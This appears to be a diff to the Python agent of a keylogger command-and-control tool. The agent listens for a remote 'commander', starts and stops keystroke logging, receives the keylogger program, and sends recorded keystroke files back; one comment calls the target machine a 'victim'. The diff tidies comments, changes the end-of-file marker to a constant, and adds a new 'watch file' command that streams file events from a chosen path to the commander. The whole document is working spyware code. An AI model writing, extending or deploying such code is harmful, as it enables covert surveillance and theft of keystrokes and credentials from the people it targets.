@@ -26,7 +26,7 @@ if __name__ == '__main__':
                     print(constants.CLIENT_DISCONNECT_MSG.format(client_address[0], client_address[1]))
                     break
 
-# a) Command to start/stop keylogger program
+                # a) Command to start/stop keylogger program
                 if data.decode() == constants.START_KEYLOG_MSG:
                     print(constants.START_KEYLOGGER_PROMPT)
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
@@ -90,8 +90,7 @@ if __name__ == '__main__':
                             status = client_socket.send(constants.STATUS_FALSE.encode())
                             msg = client_socket.send(constants.FILE_NOT_FOUND_TO_CMDR_ERROR.format(file_name).encode())
 
-
-# b) Command to GET keylog program from commander
+                # b) Command to GET keylog program from commander
                 if data.decode() == constants.GET_KEYLOGGER_MSG:
                     print(constants.CLIENT_RESPONSE.format(constants.GET_KEYLOGGER_MSG))
 
@@ -103,7 +102,7 @@ if __name__ == '__main__':
                     print(constants.RECEIVING_FILE_MSG.format(filename))
 
                     with open(filename, constants.WRITE_BINARY_MODE) as file:
-                        eof_marker = b"EOF"  # Define the end-of-file marker
+                        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
 
                         while True:
                             file_data = client_socket.recv(1024)
@@ -122,7 +121,7 @@ if __name__ == '__main__':
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
 
-# c) Check if data is to send recorded keystroked file to commander
+                # c) Check if data is to send recorded keystroked file to commander
                 if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
                     print(constants.CLIENT_RESPONSE.format(data.decode()))
                     print("[+] Client has requested to transfer all recorded keylog files...")
@@ -162,7 +161,7 @@ if __name__ == '__main__':
                                     client_socket.send(data)
 
                             # Send EOF signal to prevent receiver's recv() from blocking
-                            client_socket.send(constants.END_OF_FILE_SIGNAL)
+                            client_socket.send(constants.FILE_END_OF_FILE_SIGNAL)
 
                             # Get an ACK from victim for success
                             transfer_result = client_socket.recv(1024).decode()
@@ -183,6 +182,34 @@ if __name__ == '__main__':
                         # If no .txt keylog files present
                         print(constants.SEARCH_FILES_ERROR_MSG)
                         client_socket.send(constants.SEARCH_FILES_ERROR_SEND.encode())
+
+                # d) WATCH FILE
+                if data.decode() == constants.WATCH_FILE_SIGNAL:
+                    print("[+] Client says: {}".format(constants.WATCH_FILE_SIGNAL))
+
+                    # Get file name from client
+                    file_path = client_socket.recv(1024).decode()
+                    print("[+] Client has requested to watch the following file (path): {}".format(file_path))
+
+                    # Check if file exists (in a given path) + Apply logic
+                    if os.path.exists(file_path):
+                        print(constants.WATCH_FILE_EXISTS_MSG.format(file_path))
+                        client_socket.send((constants.STATUS_TRUE + "/" +
+                                            constants.WATCH_FILE_EXISTS_MSG_TO_CMDR.format(file_path)).encode())
+
+                        # Open a separate thread to monitor commander socket (prevent recv() from program hang)
+                        signal_queue = queue.Queue()
+                        watch_stop_thread = threading.Thread(target=watch_stop_signal, args=(client_socket,
+                                                                                             signal_queue,))
+                        watch_stop_thread.daemon = True
+                        watch_stop_thread.start()
+
+                        # IMPORTANT Send to the commander whenever the file has an event
+                        watch_file(client_socket, file_path, signal_queue)
+                    else:
+                        print(constants.WATCH_FILE_NOT_EXIST_MSG.format(file_path))
+                        client_socket.send((constants.STATUS_FALSE + "/" +
+                                            constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())
 
         except ConnectionResetError:
             print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
